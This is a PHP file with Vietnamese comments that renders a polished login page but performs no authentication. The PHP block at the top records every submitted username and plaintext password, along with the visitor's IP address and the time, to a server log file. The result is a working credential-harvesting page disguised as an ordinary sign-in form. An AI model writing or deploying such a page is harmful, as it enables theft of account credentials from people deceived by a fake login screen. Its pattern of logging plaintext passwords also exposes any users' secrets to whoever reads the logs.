<?php
// Thiết lập múi giờ Việt Nam
date_default_timezone_set('Asia/Ho_Chi_Minh');

// Lấy địa chỉ IP và thời gian
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$log_file = '/var/log/user_data.log';

// Hàm ghi log
function ghi_log($data) {
    global $ip, $time, $log_file;
    $data_str = '';
    foreach ($data as $key => $value) {
        $data_str .= "$key: $value; ";
    }
    $log = "Dữ liệu: $data_str IP: $ip; Thời gian: $time\n";
    file_put_contents($log_file, $log, FILE_APPEND);
}

// Xử lý khi gửi form đăng nhập
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    ghi_log(['tài khoản' => $username, 'mật khẩu' => $password]);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng Nhập</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-image: linear-gradient(to right, #007bff, #6610f2);
            color: white;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background-color: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
            width: 350px;
            text-align: center;
        }
        h2 {
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            border: none;
            outline: none;
        }
        input[type="submit"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Đăng Nhập</h2>
        <form method="POST" action="">
            <input type="text" name="username" placeholder="Tài Khoản" required>
            <input type="password" name="password" placeholder="Mật Khẩu" required>
            <input type="submit" value="Đăng Nhập">
        </form>
    </div>
</body>
</html>